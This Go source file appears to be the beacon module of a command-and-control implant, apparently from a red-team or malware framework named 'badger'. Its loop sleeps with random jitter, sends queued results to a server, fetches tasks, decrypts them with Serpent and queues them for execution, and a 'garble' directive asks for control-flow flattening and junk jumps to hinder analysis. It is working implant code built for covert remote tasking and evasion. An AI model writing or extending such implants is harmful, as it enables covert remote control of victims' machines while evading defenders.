package beacon

import (
	"badger/link"
	"encoding/json"
	"io"
	"math/rand"
	"sync"
	"time"
)

/*
Beacon singleton

Sleep -> Base sleep time

Jitter -> variable sleep time
*/
type Beacon struct {
	Sleep  int
	Jitter int
}

var (
	beaconInstance *Beacon
	once           sync.Once
)

/*
Fetch Beacon singleton instance
*/
func GetBeaconInstance() *Beacon {
	once.Do(func() {
		beaconInstance = &Beacon{}
	})
	return beaconInstance
}

/*
Start Beacon
Runs as goroutine
*/
//garble:controlflow flatten_passes=1 junk_jumps=5 block_splits=max
func (b *Beacon) Start() {
	// Init rand source
	rand.NewSource(time.Now().Unix())
	// Fetch Link instance
	linkInstance := link.GetHttpLinkInstance()
	// Main Beacon loop
	for {
		// Calculate sleep + jitter time
		time.Sleep((time.Duration(b.Sleep) + time.Duration(rand.Intn(b.Jitter))) * time.Second)
		// Check if there is a queued Request
		if !RequestQueue.IsEmpty() {
			// Send the next Request
			linkInstance.SendRequest(RequestQueue.Dequeue())
			// Fetch new Tasks
			newTaskReq, err := linkInstance.NewTasksRequest()
			if err != nil {
				continue
			}
			resp, err := linkInstance.SendRequest(newTaskReq)
			if err != nil || resp.Body == nil {
				continue
			}
			// Read body
			body, err := io.ReadAll(resp.Body)
			if err != nil {
				continue
			}
			// Decrypt body
			decrypted, err := SerpentDecrypt(body, linkInstance.Key)
			if err != nil {
				continue
			}
			// Unmarshal Tasks
			var tasks []Task
			err = json.Unmarshal(decrypted, &tasks)
			if err != nil {
				continue
			}
			// Enqueue Tasks
			for _, task := range tasks {
				TaskQueue.Enqueue(&task)
			}
		} else { // Task queue is empty, check for new Tasks
			// Fetch new Tasks
			newTaskReq, err := linkInstance.NewTasksRequest()
			if err != nil {
				continue
			}
			resp, err := linkInstance.SendRequest(newTaskReq)
			if err != nil || resp.Body == nil {
				continue
			}
			// Read body
			body, err := io.ReadAll(resp.Body)
			if err != nil {
				continue
			}
			// Decrypt body
			decrypted, err := SerpentDecrypt(body, linkInstance.Key)
			if err != nil {
				continue
			}
			// Unmarshal Tasks
			var tasks []Task
			err = json.Unmarshal(decrypted, &tasks)
			if err != nil {
				continue
			}
			// Enqueue Tasks
			for _, task := range tasks {
				TaskQueue.Enqueue(&task)
			}
		}
	}
}
